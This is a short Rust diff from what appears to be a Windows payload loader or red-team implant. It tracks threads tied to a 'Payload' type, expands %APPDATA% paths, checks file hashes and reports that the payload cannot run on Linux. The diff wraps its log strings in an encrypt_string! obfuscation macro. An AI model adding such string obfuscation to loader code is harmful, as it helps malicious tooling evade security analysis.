@@ -25,7 +25,6 @@ use std::thread;
 pub fn calculate_path(path_with_env: &String) -> Result<PathBuf, anyhow::Error> {
     let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable
     let path: &Path = Path::new(&*expanded); // Convert to a Path
-    debug!("Expanded Path: {:?}", path);
     Ok(path.to_owned())
 }
 
@@ -33,7 +32,7 @@ pub fn create_diretory(path: &PathBuf) -> Result<(), anyhow::Error> {
     match path.parent() {
         Some(parent_dir) => {
             if fs::metadata(parent_dir).is_ok() == false {
-                info!("[+] path not exist, create: {:?}", parent_dir);
+                info!("{}{:?}",encrypt_string!("[+] path not exist, create: ") , parent_dir);
                 create_dir_all(parent_dir)?;
             }
         }
@@ -80,11 +79,15 @@ pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
 
 pub fn print_running_thread(running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>) {
     if running_thread.len() != 0 {
-        info!("[+] RUNNING thread {}", running_thread.len());
+        info!("{}{}",encrypt_string!("[+] RUNNING thread ") ,running_thread.len());
         for i in running_thread {
-            info!("-thread: {:?}", i.1);
+            info!("{}{:?}", encrypt_string!("-thread: "), i.1);
         }
     } else {
-        info!("[+] no RUNNING thread");
+        info!("{}",encrypt_string!("[+] no RUNNING thread"));
     };
+}
+
+pub fn fail_linux_message(message:String){ 
+    error!("{}{}",encrypt_string!("Its linux, impossible to run the payload: "),message);
 }
